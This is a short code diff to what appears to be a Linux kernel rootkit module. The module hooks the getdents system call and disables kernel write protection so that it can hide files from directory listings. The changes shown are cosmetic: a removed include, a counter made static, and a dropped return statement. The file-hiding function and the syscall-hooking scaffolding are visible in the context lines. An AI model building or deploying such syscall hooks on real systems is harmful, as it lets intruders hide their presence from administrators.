@@ -7,7 +7,6 @@
 #include <linux/unistd.h>
 
 #include "include.h"
-#include "main.h"
 
 /* pointers to some important kernel functions/resources */
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
@@ -17,7 +16,7 @@ asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf
  * call counter to ensure that we are not unhooking the
  * getdents function while it is in use
  */
-int getdents_call_counter = 0;
+static int getdents_call_counter = 0;
 
 /* Check whether we need to hide this file */
 int hide(char *d_name)
@@ -158,6 +157,4 @@ void unhook_getdents(void) {
 
 	/* reenable write protection */
 	enable_page_protection();
-	
-	return;
 }
